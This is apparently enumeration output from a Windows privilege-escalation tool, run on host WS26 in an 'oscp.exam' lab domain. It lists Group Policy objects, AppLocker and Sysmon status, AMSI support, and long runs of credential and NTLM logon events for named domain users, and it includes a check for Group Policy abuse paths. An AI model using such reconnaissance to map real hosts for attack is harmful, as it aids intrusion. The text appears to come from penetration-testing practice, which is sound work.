   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
   File Sys Path    :     C:\Windows\system32\GroupPolicy\DataStore\0\sysvol\oscp.exam\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine
   Link             :     LDAP://DC=oscp,DC=exam
   GPO Link         :     Domain
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     user
   Display Name     :     Local Group Policy
   Name             :     Local Group Policy
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F73-3407-48AE-BA88-E8213C6761F1}]
   File Sys Path    :     C:\Windows\System32\GroupPolicy\User
   Link             :     Local
   GPO Link         :     Local Machine
   Options          :     All Sections Enabled

   =================================================================================================


╔══════════╣ Potential GPO abuse vectors (applied domain GPOs writable by current user)
    No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.

╔══════════╣ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



╔══════════╣ Enumerating Sysmon process creation logs (1)
      Unable to query Sysmon event logs, Sysmon likely not installed.

╔══════════╣ Installed .NET versions

  CLR Versions
   4.0.30319

  .NET Versions
   4.8.09032

  .NET & AMSI (Anti-Malware Scan Interface) support
      .NET version supports AMSI     : True
      OS supports AMSI               : True
        [!] The highest .NET version is enrolled in AMSI!


════════════════════════════════════╣ Interesting Events information ╠════════════════════════════════════

╔══════════╣ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

  Subject User       :         Administrator
  Subject Domain     :         WS26
  Created (UTC)      :         2/22/2026 10:30:54 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 10:28:43 AM
  IP Address         :         192.168.49.104
  Process            :         C:\Windows\System32\svchost.exe
  Target User        :         Administrator
  Target Domain      :         WS26

   =================================================================================================

  Subject User       :         Administrator
  Subject Domain     :         WS26
  Created (UTC)      :         2/22/2026 9:25:53 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 9:19:21 AM
  IP Address         :         192.168.49.104
  Process            :         C:\Windows\System32\svchost.exe
  Target User        :         Administrator
  Target Domain      :         WS26

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 8:42:20 AM
  IP Address         :         192.168.49.104
  Process            :         C:\Windows\System32\svchost.exe
  Target User        :         r.andrews
  Target Domain      :         OSCP

   =================================================================================================

  Subject User       :         g.jarvis
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 8:26:05 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         g.jarvis
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 7:55:26 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 7:50:45 AM
  IP Address         :         -
  Process            :         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Target User        :         r.andrews
  Target Domain      :         OSCP.EXAM

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 7:50:45 AM
  IP Address         :         -
  Process            :         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Target User        :         r.andrews
  Target Domain      :         OSCP.EXAM

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 7:50:45 AM
  IP Address         :         -
  Process            :         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Target User        :         r.andrews
  Target Domain      :         OSCP.EXAM

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 7:39:21 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 7:31:36 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 7:25:32 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 7:13:42 AM
  IP Address         :         192.168.49.104
  Process            :         C:\Windows\System32\svchost.exe
  Target User        :         r.andrews
  Target Domain      :         OSCP

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 7:13:30 AM
  IP Address         :         192.168.49.104
  Process            :         C:\Windows\System32\svchost.exe
  Target User        :         r.andrews
  Target Domain      :         OSCP

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 4:04:37 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:50:56 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:16:04 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         r.andrews
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:08:33 AM
  IP Address         :         192.168.49.104
  Process            :         
  Target User        :         username
  Target Domain      :         

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:03:11 AM
  IP Address         :         192.168.49.104
  Process            :         C:\Windows\System32\svchost.exe
  Target User        :         r.andrews
  Target Domain      :         OSCP

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:02:00 AM
  IP Address         :         -
  Process            :         C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  Target User        :         Administrator
  Target Domain      :         WS26

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:01:58 AM
  IP Address         :         -
  Process            :         C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  Target User        :         Administrator
  Target Domain      :         WS26

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:01:58 AM
  IP Address         :         -
  Process            :         C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  Target User        :         Administrator
  Target Domain      :         WS26

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:01:54 AM
  IP Address         :         -
  Process            :         C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  Target User        :         Administrator
  Target Domain      :         WS26

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:01:53 AM
  IP Address         :         -
  Process            :         C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  Target User        :         Administrator
  Target Domain      :         WS26

   =================================================================================================

  Subject User       :         WS26$
  Subject Domain     :         OSCP
  Created (UTC)      :         2/22/2026 3:01:53 AM
  IP Address         :         -
  Process            :         C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  Target User        :         Administrator
  Target Domain      :         WS26

   =================================================================================================


╔══════════╣ Printing Account Logon Events (4624) for the last 10 days.

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 10:28:43 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       Negotiate
  Lm Package                   :       
  Logon Type                   :       RemoteInteractive
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       %%1843
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:28:40 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:12:39 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:10:03 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:09:01 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:08:00 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:07:06 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       b.martin
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:06:59 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:06:54 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       b.martin
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:06:53 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       b.martin
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:05:57 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:04:56 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:03:55 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:02:53 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:01:52 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 10:00:49 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:59:48 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:58:46 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:57:44 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:56:43 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:55:41 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:54:40 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:53:38 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:52:37 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:51:35 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:50:34 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:49:32 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:48:31 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:47:29 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:46:28 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:45:26 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:44:25 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:43:24 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:42:22 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:41:20 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:40:18 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:39:17 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:38:16 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:37:13 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:35:45 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:32:04 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 9:19:21 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       Negotiate
  Lm Package                   :       
  Logon Type                   :       RemoteInteractive
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       %%1843
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 9:19:15 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       Administrator
  Target Domain Name           :       WS26
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:47:45 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       WS26$
  Subject Domain Name          :       OSCP
  Created (Utc)                :       2/22/2026 8:42:20 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       Negotiate
  Lm Package                   :       
  Logon Type                   :       RemoteInteractive
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       %%1843
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:42:18 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       r.andrews
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:41:59 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:39:28 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:37:12 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:36:50 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:36:24 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:35:21 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:33:59 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:33:38 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:32:55 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:30:48 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:28:57 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

  Subject User Name            :       -
  Subject Domain Name          :       -
  Created (Utc)                :       2/22/2026 8:28:30 AM
  IP Address                   :       192.168.49.104
  Authentication Package       :       NTLM
  Lm Package                   :       NTLM V2
  Logon Type                   :       Network
  Target User Name             :       g.jarvis
  Target Domain Name           :       OSCP
  Target Outbound User Name    :       -
  Target Outbound Domain Name  :       -

   =================================================================================================

